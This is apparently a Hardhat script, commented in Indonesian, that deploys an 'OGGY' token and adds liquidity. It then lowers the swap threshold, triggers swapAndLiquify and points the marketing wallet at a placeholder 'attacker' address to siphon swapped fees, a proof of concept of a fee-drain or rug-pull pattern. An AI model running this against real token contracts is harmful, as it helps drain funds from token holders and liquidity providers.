const hre = require("hardhat");

async function main() {
  const [deployer] = await hre.ethers.getSigners();
  console.log("Deploying contracts with:", deployer.address);

  const routerAddress = "0xD99D1c33F9fC3444f8101754aBC46c52416550D1";
  const OggyInu = await hre.ethers.getContractFactory("OGGY");
  const oggy = await OggyInu.deploy(routerAddress);
  await oggy.deployed();
  console.log("OggyInu deployed to:", oggy.address);

  const pairAddress = await oggy.pair();
  console.log("Pair address:", pairAddress);

  const deployerBalance = await oggy.balanceOf(deployer.address);
  console.log("Deployer Balance:", hre.ethers.utils.formatUnits(deployerBalance, 9), "OGGY");

  await oggy.EnableTrading();
  console.log("Trading dan swap diaktifkan");

  const tokenAmount = hre.ethers.utils.parseUnits("1000000", 9);
  const bnbAmount = hre.ethers.utils.parseEther("1");
  await oggy.approve(routerAddress, tokenAmount);
  await oggy.addLiquidity(tokenAmount, bnbAmount, { value: bnbAmount });
  console.log("Likuiditas awal ditambahkan");

  await oggy.updateSwapTokensAtAmount(1);
  console.log("swapTokensAtAmount diturunkan ke 1 miliar token");

  const transferAmount = hre.ethers.utils.parseUnits("2000", 9);
  const userAddress = "0xUserAddress"; // Ganti dengan alamat lain
  await oggy.transfer(userAddress, transferAmount);
  console.log("Transfer kecil dilakukan untuk memicu swapAndLiquify");

  const attackerWallet = "0xAttackerWalletAddress"; // Ganti dengan alamat lain
  await oggy.updateMarketingWallet(attackerWallet);
  console.log("marketingWallet diubah ke:", attackerWallet);

  const contractBalance = await oggy.balanceOf(oggy.address);
  const attackerBalance = await hre.ethers.provider.getBalance(attackerWallet);
  console.log("Contract Balance:", hre.ethers.utils.formatUnits(contractBalance, 9), "OGGY");
  console.log("Attacker BNB Balance:", hre.ethers.utils.formatEther(attackerBalance));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
